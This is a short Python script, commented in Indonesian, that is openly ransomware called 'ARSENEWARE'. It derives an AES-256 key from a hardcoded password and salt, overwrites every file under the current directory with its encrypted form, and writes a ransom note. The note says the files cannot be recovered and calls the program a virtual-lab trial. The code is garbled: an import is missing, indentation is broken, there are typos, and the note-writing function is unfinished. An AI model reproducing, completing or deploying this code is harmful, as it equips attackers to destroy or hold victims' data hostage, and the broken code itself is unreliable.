import os
import getpass
from Crypto.Cipher import AES
from Crypto.Protocol.KDF import PBKDF2
from Crypto.Util.Padding import pad
from Crypto.Random import get_random_bytes

#Config 
PASSWORD = "2753161"
SALT = "12345678"
KEY_SIZE = 32
ITERATIONS = 100000

def generate_key(password):
  """Generate 256-bit dar pass+salt"""
  return PBKDF2(password,SALT,KEY_SIZE, count=ITERATIONS, hmac_hash_module=SHA256)

def encrypt_file(key, filepath):
  """mengenkripsi file dengan path AES256"""
  try:
    cipher = AES.new(key, AES.MODE_CBC)
    with open(filepath, 'rb')as f:
      plaintext = f.read()
      padded_data = pad(plaintext, AES.block_size)
      ciphertext = cipher.encrypt(padded_data)
      with open (filepath, 'wb') as f:
        f.write(cipher.iv + ciphertext)
        return true
  except Exception as e:
    with open ("error_log.txt", "a") as f:
      f.write (f"error encrypting{filepath}: {str(e)}\n")
      return False 
      def create_ransom_note(folder):
        """membuat file tebusan di setiap folder / file """
        note = """
        [ FILE INI TELAH DIKUNCI!!!!!]
        SEMUA FILE DI PERANGKAT ANDA TELAH DIKUNCI OLEH ARSENEWARE.
        FILE ANDA SUDAH TIDAK BISA DI KEMBALIKAN LAGI.INI HANYA RANSOMWARE PERCOBAAN DI LAB VIRTUAL """
          with open9os.path.join(folder, "warning.txt"), "w") as f :

      def main():
        key = generate_key(PASSWORD)
        for root, dirs, files in os.walk("."):
            for file in files:
              path = os.path.join(root, file)
              if not path.endswith("warning.txt") and not path.endswith("error_log.txt"):
                  encrypt_file(key, path)
                create_Ransom_note(root)
      if __name__ == "__main__"
      main()
      
